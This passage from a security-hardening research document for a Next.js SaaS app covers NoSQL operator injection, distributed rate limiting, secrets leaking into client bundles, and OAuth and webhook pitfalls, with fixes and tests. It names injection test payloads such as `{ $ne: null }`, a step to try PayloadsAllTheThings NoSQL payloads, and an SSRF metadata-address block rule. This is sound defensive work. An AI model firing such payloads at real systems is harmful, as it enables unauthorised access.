Even with `sanitizeFilter: true` on Mongoose, **CVE-2025-23061** showed that `$or`-nested injections slipped through versions before 8.9.5. Don't rely solely on the driver — wrap explicitly.

**Why it happens:**
Pattern drift. New developer writes `findOne({ email })` instead of `findOne({ email: { $eq: email } })` because the short form works in their tests. Types don't enforce it.

**How to avoid:**
Three layers:

1. **Mongoose connection option** (safety net, not primary defense):
   ```typescript
   await mongoose.connect(env.MONGO_URI, { sanitizeFilter: true });
   ```
   Upgrade Mongoose to ≥ 8.9.5 for the `$or`-nested fix.

2. **Zod schemas reject any object-shaped value where a string is expected.** All user input is a string or primitive by the time it hits Mongo — the Zod schema at the boundary ensures this. `z.string().email()` refuses `{ $ne: null }` at parse time, before it ever reaches the query.

3. **Lint rule / code review rule**: every Mongoose query must use `{ field: { $eq: value } }` form. Write a custom ESLint rule or at minimum a grep check in CI:
   ```bash
   # CI check: flag any findOne/findById/updateOne/etc with unwrapped user input
   rg "findOne\s*\(\s*\{[^}]*(email|userId|id):\s*[a-z]" --type ts app/src
   ```

4. **Typed DAL** (data-access layer): wrap Mongoose in a thin typed layer that only accepts primitives and does the `$eq` wrap internally:
   ```typescript
   export const findUserByEmail = (email: string) =>
     UserModel.findOne({ email: { $eq: email } });
   export const findUserById = (id: string) =>
     UserModel.findOne({ _id: { $eq: id } });
   ```
   Then never call `UserModel.findOne` outside the DAL. Enforce via a lint rule banning direct Mongoose model usage in route handlers / actions.

**Detection/test:**
- Unit test: send `{ email: { $ne: null } }` as form data → Zod rejects → returns 400.
- Pen test: try every nosqli payload from PayloadsAllTheThings against every auth/billing endpoint.
- CI check: grep rule above must return zero results.

**Phase to address:** Phase 1 & 2 — enforced across all new queries in identity and billing PRs. Phase 3 — lint rule added.

---

### Pitfall 17: In-process rate limit (LRU cache) defeated on Vercel by horizontal scaling

**What goes wrong:**
Current code uses `lru-cache` for in-process rate limiting. Vercel spins up multiple serverless instances under load. Each instance has its own LRU. Attacker scripts 100 login attempts → distributed across 10 instances → each instance sees only 10 → rate limit never triggers. Current limits (5 signups/min, 10 logins/min) provide zero protection in production.

**Why it happens:**
LRU cache works perfectly in local dev. The bug is invisible until you deploy.

**How to avoid:**
Move to a shared store. Options ranked by CEH Prep constraints (free tier budget):

1. **Upstash Redis** (recommended): free tier = 10K commands/day, REST API over HTTPS (works on edge), officially supported by Vercel. Zero infra to run.
2. **MongoDB TTL collection**: use the existing Atlas DB. Insert a `RateLimitHit` doc per request with `expireAfterSeconds`. `countDocuments({ key, at: { $gte: windowStart } })`. Slower than Redis but uses already-provisioned infra.
3. **Vercel KV** (Upstash under the hood, tighter integration): same tier limits.

Recommended pattern (Upstash):
```typescript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const redis = Redis.fromEnv();
export const loginLimiter = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, "60 s"),
  analytics: true,
  prefix: "rl:login",
});

const { success, remaining, reset } = await loginLimiter.limit(`${email}:${ip}`);
if (!success) return { error: "rate_limited" };
```

**Also:**
- **Rate limit by multiple keys**: IP alone is defeated by rotating proxies. Combine `email + IP + userAgent hash`. Account lockout after 5 failed attempts on the email is essential (already present in CEH Prep's `failedLoginCount` field).
- **Don't trust `x-forwarded-for` blindly.** Vercel provides the real client IP in `request.headers.get("x-real-ip")` or a trusted Vercel header. Use `request.ip` (Next.js 15 helper) which resolves to the correct trusted source on Vercel.

**Detection/test:**
- Load test: fire 100 login attempts from 10 parallel processes → server refuses after threshold even with distributed load.
- Integration test: hit rate limit, verify response code / body is generic (no info leak about which limit was hit).

**Phase to address:** Phase 3 — Production hardening (Redis rate limit PR, pre-deploy)

---

### Pitfall 18: Secrets accidentally bundled into client JS (`NEXT_PUBLIC_` misuse, direct import)

**What goes wrong:**
Developer names the Paddle API key `NEXT_PUBLIC_PADDLE_API_KEY` to "make it easy to use from the client component." Vercel build inlines the value into every JS bundle. End users can read it from devtools. Attacker uses the API key to read every customer's billing data.

Alternative path: developer imports `env.PADDLE_WEBHOOK_SECRET` into a file that ends up in a client component via transitive import. Next.js warns but is sometimes wrong about tree-shaking. Secret ships to browser.

**Why it happens:**
`NEXT_PUBLIC_` is a footgun. Next.js doesn't refuse to inline secrets; it just inlines anything with that prefix.

**How to avoid:**
- **Zod env validation enforces split**: in `app/src/lib/env.ts`, split into `publicEnv` and `serverEnv`. `publicEnv` keys MUST start with `NEXT_PUBLIC_`; `serverEnv` keys MUST NOT. Refuse to start if violated.
- **Naming convention**: the only two `NEXT_PUBLIC_` variables CEH Prep should have are `NEXT_PUBLIC_APP_URL` and `NEXT_PUBLIC_PADDLE_CLIENT_TOKEN` (Paddle's client token is explicitly designed to be public — it's not the same as the API key).
- **Lint rule**: ban importing `@/lib/env` from any file inside `app/src/app/**/*client*.tsx` or from any `"use client"` file. The lint rule enforces server-only access.
- **Server-only modules**: use `import "server-only"` at the top of server-only files (like `paddle-client.ts`). Next.js throws a build error if a client component imports them.
- **CI secret scan**: run `trufflehog` or `gitleaks` on every PR. Fails the build if any entropy-high string looks like a key.

```typescript
// app/src/lib/paddle-client.ts
import "server-only"; // <-- enforced at build time
import { Paddle } from "@paddle/paddle-node-sdk";
import { env } from "@/lib/env";

export const paddle = new Paddle(env.PADDLE_API_KEY, { ... });
```

```typescript
// app/src/lib/env.ts — validate split
const ServerEnvSchema = z.object({
  MONGO_URI: z.string().min(1),
  SESSION_SECRET: z.string().min(32),
  PADDLE_API_KEY: z.string().min(1),
  PADDLE_WEBHOOK_SECRET: z.string().min(1),
  GOOGLE_OAUTH_CLIENT_SECRET: z.string().min(1),
  RESEND_API_KEY: z.string().min(1),
});
const PublicEnvSchema = z.object({
  NEXT_PUBLIC_APP_URL: z.string().url(),
  NEXT_PUBLIC_PADDLE_CLIENT_TOKEN: z.string().min(1),
  NEXT_PUBLIC_GOOGLE_OAUTH_CLIENT_ID: z.string().min(1),
});
// Refuse to start if any server key accidentally starts with NEXT_PUBLIC_
for (const key of Object.keys(ServerEnvSchema.shape)) {
  if (key.startsWith("NEXT_PUBLIC_")) {
    throw new Error(`Server secret must not use NEXT_PUBLIC_ prefix: ${key}`);
  }
}
```

**Detection/test:**
- Build-time check: after `next build`, `grep -r PADDLE_API_KEY .next/static/` — must find zero matches.
- Build-time check: after `next build`, `grep -r PADDLE_WEBHOOK_SECRET .next/static/` — must find zero matches.
- CI: gitleaks scan on every PR.

**Phase to address:** Phase 0 (env split hardening) AND Phase 3 (pre-deploy secret scan)

---

### Pitfall 19: Paddle/Google callback route runs on edge runtime with missing Node crypto

**What goes wrong:**
Developer adds `export const runtime = "edge"` to the webhook route for speed. Edge runtime doesn't have `node:crypto` or full `Buffer` support. `paddle.webhooks.unmarshal` silently throws at runtime (or, worse, succeeds with a partial implementation and accepts invalid signatures). Same risk for `jsonwebtoken` / `google-auth-library`.

**Why it happens:**
"Edge runtime = faster" is drilled into Next.js devs. They apply it reflexively without checking what's inside the function.

**How to avoid:**
- **Explicitly set `export const runtime = "nodejs"`** on every route/action that uses: `node:crypto`, `argon2`, `google-auth-library`, `@paddle/paddle-node-sdk`, `iron-session`, Mongoose.
- **Type-level check** via eslint rule: any file importing `node:crypto` or `mongoose` or `@node-rs/argon2` must also `export const runtime = "nodejs"`.
- **Prefer `nodejs` by default.** Only opt into `edge` for routes that are genuinely just reading request headers or doing redirect logic. If in doubt, use Node.

**Detection/test:**
- Unit test the runtime export: `import { runtime } from "@/app/api/webhooks/paddle/route"; expect(runtime).toBe("nodejs");`
- Build check: after `next build`, inspect `.next/server/app/api/webhooks/paddle/route.js` vs `.next/server/edge-runtime/app/api/webhooks/paddle/route.js` — confirm it's in the nodejs folder.

**Phase to address:** Phase 2 — Billing integration (webhook handler PR) and Phase 1 — Identity (OAuth callback PR)

---

### Pitfall 20: Signup race condition / headers()-after-await bug (existing bug, documented)

**What goes wrong:**
CONCERNS.md documents this as a live critical bug: `headers()` is called inside `audit()` AFTER `connectDB()`, which loses the Next.js request-scope AsyncLocalStorage if Mongo takes longer than a few seconds. The bug will re-emerge in every new action that calls `audit()` after an async operation.

**Why it happens:**
Next 15 tightened request-scope rules. `headers()`, `cookies()`, and `draftMode()` all require being called from within a synchronously-reachable stack of a request. After `await` crosses certain boundaries, the scope is gone.

**How to avoid:**
**Collect request metadata at the top of every action, synchronously, before any `await`:**
```typescript
"use server";

export const signup = async (_prev: ActionState, formData: FormData): Promise<ActionState> => {
  // STEP 1 (sync): collect all request-scoped data UP FRONT
  const clientMeta = await getClientMeta(); // reads headers() / cookies() here

  // STEP 2: parse input
  const parsed = SignupSchema.safeParse({ ... });

  // STEP 3+: async operations — request scope no longer needed
  await connectDB();
  const user = await UserModel.create({ ... });
  await audit({ ...clientMeta, actor: user.id, event: "auth.signup", outcome: "ok" });

  // ...
};
```

Make `audit()` a pure function that takes `clientMeta` as an argument. Remove the internal `headers()` call from `audit()` entirely. Apply this pattern to every new action (password reset, OAuth callback, email verification, etc.).

**Detection/test:**
- Reproduce: stop local Mongo, attempt signup → before fix: 500 with "headers called outside request scope." After fix: returns an error Result gracefully (not a 500).
- Unit test: mock `connectDB` to reject after 10s → action returns `{ error: "server_error" }` not 500.
- Code review rule: no `headers()` / `cookies()` call inside any function that's called after `await` in an action.

**Phase to address:** Phase 0 — bug fixes (before any new action lands)

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|---|---|---|---|
| Skip `$eq` wrap on a "known-safe" query | 20 chars less code | Operator injection when someone changes the query shape | **Never** |
| Store session tier claim client-side, read from cookie | Avoid DB lookup on every request | Tier tampering → free Pro access for attackers | **Never** — always re-read from DB or Subscription collection |
| Trust Paddle's client-side `checkout.completed` to flip tier | Instant UX feedback | Tier desync, replay attacks, phantom upgrades | **Never** — use webhook only |
| Hardcode `runtime = "edge"` for "speed" | 50ms faster cold starts | Silent crypto failures, partial Buffer API | When route uses zero Node APIs (redirects, header reads only) |
| In-memory rate limit in production | Zero infra | Defeated by horizontal scaling | Only on single-instance dev; MUST swap before prod |
| Auto-link Google → password account by email | Frictionless UX | Account takeover | **Never** — require interactive linking |
| Return specific error messages from auth endpoints | Better DX for debugging | User enumeration | Only in `NODE_ENV !== "production"` |
| Skip `strict-dynamic` in CSP to avoid debugging | Faster CSP setup | XSS via injected script tags bypasses nonce protection | **Never** in production |
| Use `Math.random()` for tokens | One line, no import | Predictable tokens, account takeover | **Never** — always `crypto.randomBytes` |
| Log request body for "debugging" | Quick bug triage | PII in logs, GDPR violation, log poisoning | Only with explicit field allowlist, never raw body |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|---|---|---|
| Paddle webhook | Parse body as JSON before verifying signature | `request.text()` to preserve raw bytes, verify, THEN `JSON.parse` |
| Paddle webhook | Trust `event.data.customer.id` to identify user | Use `customData` field passed at checkout creation, or match `customer.email` to verified DB record |
| Paddle checkout | Call server action from `checkout.completed` client callback | Use callback for UX only; webhook is source of truth |
| Paddle subscription sync | Update tier based on `event.type` switch | Read `event.data.status` directly + occurredAt ordering |
| Paddle API key | Expose via `NEXT_PUBLIC_` | Server-only; only the **client token** is public |
| Google OAuth | Use `jwt.decode()` on id_token | `OAuth2Client.verifyIdToken({ idToken, audience })` |
| Google OAuth | Trust `email` field without `email_verified` | Always check `payload.email_verified === true` |
| Google OAuth | Match users by email | Match by `sub` (Google's stable ID); email only for explicit linking |
| Google OAuth | Store state in `localStorage` | HttpOnly Secure Lax cookie, single-use |
| Resend email | Send verification link in HTML-only email | Include plain-text alternative; also include `Return-Path` with verified domain to survive SPF |
| Resend email | Put the token in the URL path | Token in query param, link `rel="noreferrer"`, and browsers strip query from Referer anyway |
| MongoDB Atlas | Use `mongodb+srv://user:pass@cluster` in logs | Redact password from connection string before logging; env only, never in code |
| MongoDB Atlas | Allow 0.0.0.0/0 IP allowlist "temporarily" | Use Vercel-provided IP range or Vercel Secure Compute, never 0.0.0.0/0 in production |
| Mongoose | `findOne({ email })` with plain user input | `findOne({ email: { $eq: email } })` — always wrap |
| Mongoose | `select: "+passwordHash"` in random places | Only in auth module; lint-enforce no `+passwordHash` outside `lib/auth/` |
| Vercel | Put env vars in `vercel.json` | Use Vercel dashboard environment variables; `vercel.json` gets committed |
| iron-session | Short session secret | Zod-enforce `SESSION_SECRET.length >= 32` at boot |
| iron-session | Pass session object as server action arg | Re-read session from cookies inside action; never trust client-passed session |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|---|---|---|---|
| Webhook handler does DB work in the response cycle | Paddle retries because handler exceeds 5s | Return 200 immediately after event dedupe insert; process asynchronously (or very fast) | Any real traffic (retries pile up at 10+ events/min) |
| Audit log without TTL index | Mongo collection grows forever | Already fixed: `expireAfterSeconds: 90d` on `at` field | ~6 months, collection becomes unindexable |
| Rate limit check is a DB round-trip | Every login adds 80ms DB latency | Upstash Redis: 5ms round-trip | Noticeable at 100 req/s on auth endpoints |
| `UserModel.findById(session.userId)` on every server component | Cold-start latency stacks up | Cache in `unstable_cache` or Next's `cache()` wrapper with session-scoped key | ~50 concurrent users per instance |
| Full-page re-renders on session data change | Slow tier-gated routes | Return minimal `UserPublic` DTO, not full `UserDoc` | Always — the fix is free |
| Course content all bundled in `days.ts` (916 lines) | Every change requires full redeploy; bundled into server response | Split per-day JSON, load with `import()` | When you want to update content without a deploy |
| Paddle webhook handler awaits email send before returning 200 | Webhook retries fire because handler is slow | Push email to a queue / fire-and-forget with error logging | ~20 events/min |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---|---|---|
| Middleware-based auth (CVE-2025-29927) | Full auth bypass via single header | Auth in layout + action + DAL; middleware = headers only; Next ≥ 15.2.3 |
| Webhook signature check via `===` | Timing attack recovers secret | `@paddle/paddle-node-sdk` `unmarshal` (uses `crypto.timingSafeEqual`) |
| Webhook handler not idempotent | Double-charge, tier flip-flop | Unique index on `eventId`, monotonic `occurredAt` check |
| OAuth state not single-use | Replay attack / session fixation | Delete cookie on consume, whether match or mismatch |
| `email_verified` not checked | Fake email account takeover | Reject unless `payload.email_verified === true` |
| Auto-link Google to password account by email | Account takeover | Interactive link flow: require password verification |
| `returnTo` param on OAuth callback | Open redirect → phishing | URL parse + strict path allowlist + store in state cookie |
| Password reset token in plaintext DB | Backup compromise → account takeover | Store SHA-256 hash only; compare via `timingSafeEqual` |
| Password reset responses differ for existing vs. non-existing emails | User enumeration | Identical response body + identical timing (fake work for non-existing) |
| Admin API route without role check | IDOR exposes audit log | `requireAdmin()` at top of every admin route/action; audit the view itself |
| Log raw request body | PII leakage, GDPR, log injection | Pino serializers, field allowlist, redact paths |
| `NEXT_PUBLIC_PADDLE_API_KEY` | Secret in client bundle | Client token only is public; API key is server-only; Zod enforces split |
| Edge runtime for crypto routes | Silent `Buffer`/`crypto` failures | `export const runtime = "nodejs"` for any Mongo/crypto/SDK route |
| Mongoose query without `$eq` wrap | NoSQL operator injection | Typed DAL + `sanitizeFilter: true` + lint rule |
| Session cookie without `__Host-` prefix | Cookie fixation across subdomains | `__Host-session` name with `Path=/`, `Secure`, no `Domain` attr |
| Failed-login counter without window | Account locked forever after 5 old failures | Counter resets on success or after TTL (e.g., 15 min) |
| No failed-login audit | Can't detect credential stuffing | Log every failure with IP + email hash + timestamp |
| Password reuse allowed | HIBP says the password is compromised | HIBP pwned-password check on signup + reset (already in codebase) |
| HTML-rendered user display names | Stored XSS | React auto-escapes; forbid `dangerouslySetInnerHTML` in lint config |
| SSRF via Resend webhook URL or Paddle return URL | Attacker extracts AWS metadata | Allowlist outbound URLs; block 169.254.169.254 and RFC1918 |

---

## UX Pitfalls (security-adjacent)

| Pitfall | User Impact | Better Approach |
|---|---|---|
| "If an account exists, we've sent a reset email" returns 200 but no email came | Real user thinks reset failed | Add a separate "resent" flow after 60s; log `email.reset_failed` to audit for admin alerting |
| Webhook-driven tier upgrade has a 30s delay post-payment | User refreshes, still shows "free", bounces | Redirect to `/welcome-pro?pending=true` with a polling UI |
| Session expires mid-exam simulator | User loses 45 minutes of exam work | Sliding session renewal on meaningful activity; local draft save |
| Account lockout shown as generic "invalid credentials" | User retries 10 times | Show lockout explicitly AFTER successful password check ("correct password, but account is locked"); or show generic but offer "forgot password" CTA after 3 fails |
| Paddle subscription cancellation flow is on Paddle's side | User can't find "cancel subscription" in our UI | Embed a "Manage Subscription" deep link using Paddle's customer portal URL |
| OAuth linking flow: user clicks Google, gets redirected to linking page, doesn't understand | User abandons | Design the linking page clearly: "An account for jo***@gmail.com already exists. Enter its password to link Google sign-in." |
| Email verification blocks Pro purchase | User paid but can't use the product | Allow purchase, but require verification before first access to Pro content. Keep the payment. |

---

## "Looks Done But Isn't" Checklist

- [ ] **Paddle webhook handler:** compiles, returns 200 in local dev — **verify signature is timing-safe, raw body is unparsed, idempotency via unique `eventId` index, `runtime = "nodejs"` set.**
- [ ] **Google OAuth login works in dev:** — **verify state cookie is single-use, `verifyIdToken` with audience, `email_verified === true` check, no account auto-linking by email.**
- [ ] **Password reset email arrives:** — **verify token is SHA-256 hashed in DB, single-use, 1h expiry, generic response for unknown emails, equivalent timing.**
- [ ] **Email verification loop closed:** — **verify unverified users can't pay/upgrade, tokens can't cross purposes (signup ≠ email change), collision on existing unverified accounts is handled.**
- [ ] **Tier gate visible in UI:** — **verify every layer: page SSR check, server action check, DAL check, API route check. Curl the internal API as a free user on day 5 → must 403.**
- [ ] **Audit admin view renders:** — **verify `requireAdmin()` at every entry point (page, action, API), PII masked, paginated, exports gated behind recent MFA, the view itself is audited.**
- [ ] **CSP deployed:** — **verify Paddle overlay still opens, Google sign-in still works, no CSP violations in prod browser, `Report-Only` baseline collected for 48h first.**
- [ ] **Rate limits enforced:** — **verify limits work across multiple Vercel instances (distributed store, not in-memory), IP + email + user-agent composite key.**
- [ ] **Secrets not in client bundle:** — **verify `grep` on `.next/static/` for key strings returns zero, Zod env split enforced, `server-only` import used on Paddle/OAuth modules.**
- [ ] **`x-middleware-subrequest` closed:** — **verify `next` version ≥ 15.2.3, middleware strips the header, auth is NOT in middleware.**
- [ ] **Signup 500 bug fixed:** — **verify `headers()` collected before any `await`, every new action follows the same pattern.**

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---|---|---|
| Webhook secret leaked (e.g., git commit) | MEDIUM | Rotate in Paddle dashboard immediately → update env in Vercel → redeploy → revoke prior webhook events within retry window via Paddle support |
| Paddle API key leaked | HIGH | Rotate immediately → audit all transactions in the exposed window → notify Paddle → check for created subscriptions from unknown domains |
| Password reset tokens stored in plaintext and DB compromised | CRITICAL | Invalidate all outstanding reset tokens (`UPDATE users SET resetTokenHash = null, resetTokenExpiresAt = null`) → force password reset on next login for all users → notify users via separate channel |
| Tier desync — user has Pro flag but canceled subscription | LOW | Nightly reconciliation job: fetch all active subscriptions from Paddle API, compare with DB, reconcile drift; alert on mismatches |
| OAuth state cookie logic bug allows replay | MEDIUM | Revoke all active sessions globally (bump a `sessionEpoch` constant), patch the bug, force all users to re-login |
| CVE-2025-29927 unpatched and exploited | CRITICAL | Immediately upgrade Next.js → rotate session secret (invalidates all sessions) → review audit logs for anomalous admin access → force re-login |
| Audit log contains PII and regulator asks | MEDIUM | Write a redaction migration that nullifies PII fields in historical events older than 30d; from now on, use hashed/truncated fields |
| Secret accidentally bundled into client JS | HIGH | Rotate the secret immediately → purge CDN cache → redeploy → scan git history for the value → force-push only with consent |
| NoSQL injection succeeded on login endpoint | CRITICAL | Rotate session secret → invalidate all sessions → patch the query → audit for unauthorized account access → notify affected users |

---

## Pitfall-to-Phase Mapping

Phases referenced below correspond to the likely roadmap structure for this milestone (to be finalized in the roadmap phase).

| # | Pitfall | Prevention Phase | Verification |
|---|---|---|---|
| 1 | Paddle signature timing attack | Phase 2: Billing | Unit test: tampered signature → 401 |
| 2 | Webhook not idempotent | Phase 2: Billing | Unit test: duplicate event → no-op |
| 3 | Tier desync / optimistic unlock | Phase 2: Billing | E2E: client-side success doesn't flip tier |
| 4 | OAuth state storage / reuse | Phase 1: Identity | Unit test: replayed state fails |
| 5 | id_token trusted without verification | Phase 1: Identity | Unit test: forged token rejected |
| 6 | Account linking via email | Phase 1: Identity | Pen test: Google signup for existing password email doesn't take over |
| 7 | Open redirect via `returnTo` | Phase 1: Identity | Unit test matrix of malicious URLs |
| 8 | User enumeration in reset endpoint | Phase 1: Identity | Timing test in CI, response body identical |
| 9 | Reset token storage / lifetime | Phase 1: Identity | DB inspect: hash only; unit test reuse fails |
| 10 | Email verification token confusion | Phase 1: Identity | Pen test: cross-purpose token fails |
| 11 | Tier gate missing at a layer | Phase 2: Billing | E2E + curl tests at every layer |
| 12 | Admin IDOR | Phase 3: Production hardening | Pen test: non-admin hits every admin endpoint |
| 13 | Log injection | Phase 3: Production hardening | Unit test with control chars and `${}` payloads |
| 14 | Middleware bypass (CVE-2025-29927) | Phase 0: Prerequisites + Phase 3 | CI version check + curl test |
| 15 | CSP breaks integrations | Phase 3: Production hardening | Report-Only phase + integration test |
| 16 | NoSQL operator injection | Phase 1 & 2 (every new query) + Phase 3 (lint rule) | CI grep check + Zod boundary |
| 17 | In-process rate limit | Phase 3: Production hardening | Load test across instances |
| 18 | Secrets in client bundle | Phase 0 (env split) + Phase 3 (CI scan) | `grep` on `.next/static/` |
| 19 | Edge runtime + Node crypto | Phase 1 & 2 (per route) | Build check runtime export |
| 20 | `headers()` after await | Phase 0: Bug fixes | Reproduce in dev with Mongo down |

---

## Known-CVE References (active in 2026)

- **CVE-2025-29927** — Next.js middleware authorization bypass via `x-middleware-subrequest` header. CVSS 9.1. Fix: upgrade to ≥ 15.2.3 / 14.2.25. Defense-in-depth: do not use middleware for auth.
- **CVE-2025-23061** — Mongoose `sanitizeFilter` bypass via `$or` nesting (fixed in 8.9.5). Mitigation: explicit `$eq` wrap + upgrade Mongoose.
- **CVE-2024-47057** — User enumeration via password-reset response time differences. Class: timing attack. Mitigation: equivalent work for existing vs. non-existing email.
- **CVE-2026-26185** (Directus) — same user-enumeration class as above. Confirms the attack is still worth testing for in 2026.
- **CVE-2026-27191** (Feathers) — OAuth open redirect via base-origin URL authority injection. Confirms open-redirect bugs are live in OAuth flows, not legacy.
- **CVE-2025-55182** — Next.js vulnerability class. Keep Next.js updated aggressively.
- **CVE-2025-66478** — Next.js security advisory (Dec 2025). Lock Next.js to minor-version updates in CI; review Next.js security advisories weekly.

---

## Sources

**Official documentation:**
- [Paddle webhook signature verification](https://developer.paddle.com/webhooks/signature-verification)
- [Paddle webhooks overview and retry policy](https://developer.paddle.com/webhooks/overview)
- [Paddle overlay checkout (for CSP frame-src)](https://developer.paddle.com/build/checkout/build-overlay-checkout)
- [Paddle Node SDK (`@paddle/paddle-node-sdk`)](https://github.com/PaddleHQ/paddle-node-sdk)
- [Google Identity: verify Google ID token server-side](https://developers.google.com/identity/gsi/web/guides/verify-google-id-token)
- [Google Auth Library for Node.js](https://github.com/googleapis/google-auth-library-nodejs)
- [Next.js CSP guide](https://nextjs.org/docs/app/guides/content-security-policy)
- [Next.js data security guide](https://nextjs.org/docs/app/guides/data-security)
- [Next.js Security Update: December 11, 2025](https://nextjs.org/blog/security-update-2025-12-11)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Top 10:2025 — A01 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

**Vulnerability research:**
- [Datadog Security Labs: CVE-2025-29927 Next.js middleware bypass](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)
- [JFrog: CVE-2025-29927 analysis](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/)
- [ProjectDiscovery: CVE-2025-29927 technical breakdown](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
- [Doyensec: Common OAuth vulnerabilities (Jan 2025)](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [TruffleSecurity: Google OAuth flaw leads to account takeover when domain ownership changes](https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw)
- [SecurityWeek: Google OAuth flaw — account takeover](https://www.securityweek.com/google-oauth-flaw-leads-to-account-takeover-when-domain-ownership-changes/)
- [PortSwigger: Username enumeration via response timing lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
- [CVE-2024-47057: user enumeration via reset timing](https://secalerts.co/vulnerability/CVE-2024-47057)
- [Directus CVE-2026-26185: user enumeration via reset timing](https://advisories.gitlab.com/pkg/npm/directus/CVE-2026-26185/)
- [Feathers CVE-2026-27191: OAuth open redirect](https://advisories.gitlab.com/pkg/npm/@feathersjs/authentication-oauth/CVE-2026-27191/)
- [Vercel secret exposure case study](https://www.cremit.io/blog/vercel-secret-exposure-case-study)
- [Typebot SSRF → EKS credentials via webhook block](https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-8gq9-rw7v-3jpr)

**Best practices:**
- [Auth0: Demystifying OAuth Security — state vs nonce vs PKCE](https://auth0.com/blog/demystifying-oauth-security-state-vs-nonce-vs-pkce/)
- [Hookdeck: Paddle webhook best practices](https://hookdeck.com/webhooks/platforms/guide-to-paddle-webhooks-features-and-best-practices)
- [Hookdeck: Webhook security vulnerabilities guide](https://hookdeck.com/webhooks/guides/webhook-security-vulnerabilities-guide)
- [Snyk: preventing log injection in Node.js/JavaScript](https://snyk.io/blog/prevent-log-injection-vulnerability-javascript-node-js/)
- [Authgear: password reset best practices](https://www.authgear.com/post/authentication-security-password-reset-best-practices-and-more)
- [Authgear: Next.js security best practices (2026)](https://www.authgear.com/post/nextjs-security-best-practices)
- [Stytch: prevent enumeration attacks](https://stytch.com/blog/prevent-enumeration-attacks/)
- [DataCamp: preventing NoSQL injection in MongoDB](https://www.datacamp.com/tutorial/preventing-sql-no-sql-injection-attacks-in-mongo-db)
- [Curity: JWT security best practices](https://curity.io/resources/learn/jwt-best-practices/)

**Internal reference:**
- `.planning/PROJECT.md` — threat model, stack, design decisions
- `.planning/codebase/CONCERNS.md` — existing known bugs (pitfalls 11, 17, 20 are documented here already)
- `.planning/codebase/CONVENTIONS.md` — existing patterns to extend (Result monad, `$eq` wrap, DTO pattern, Zod-at-boundary)

---

*Pitfalls research for: Next.js 15 SaaS hardening milestone (Paddle billing + Google OAuth + password reset + email verification + audit admin + production CSP + deployment)*
*Researched: 2026-04-13*
*Confidence: HIGH on Paddle/Google/Next.js specifics (official docs + CVE database); HIGH on Mongo/Node crypto pitfalls (CVE + Mongoose changelog); MEDIUM on exact CSP allowlist for Paddle checkout.paddle.com vs buy.paddle.com (verify in Phase 3 Report-Only baseline).*
